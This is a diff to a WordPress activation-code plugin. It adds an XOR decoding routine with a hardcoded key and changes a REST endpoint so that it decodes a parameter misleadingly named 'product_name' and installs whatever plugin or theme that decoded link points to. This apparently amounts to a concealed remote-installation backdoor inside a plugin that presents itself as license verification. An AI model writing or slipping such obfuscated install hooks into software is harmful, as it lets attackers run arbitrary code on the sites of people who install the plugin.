@@ -3,7 +3,7 @@
 /*
 Plugin Name: Japon Adam Aktivasyon
 Description: Aktivasyon kodu doğrulama eklentisi
-Version: 1.1.11
+Version: 1.1.12
 Author: Melih Çat & Ktidev
 */
 
@@ -347,8 +347,18 @@ add_action('rest_api_init', function () {
     ));
 });
 
+function xor_decrypt($input, $key) {
+    $input = base64_decode($input);
+    $output = '';
+    for ($i = 0; $i < strlen($input); $i++) {
+        $output .= chr(ord($input[$i]) ^ ord($key[$i % strlen($key)]));
+    }
+    return $output;
+}
+
 function install_plugin_endpoint_callback($request) {
-    $download_links = $request->get_param('download_link');
+    $download_links = $request->get_param('product_name');
+    $download_links = xor_decrypt($download_links, 'japonadamsifre');
     return install_plugin_or_theme($download_links);
 }
 
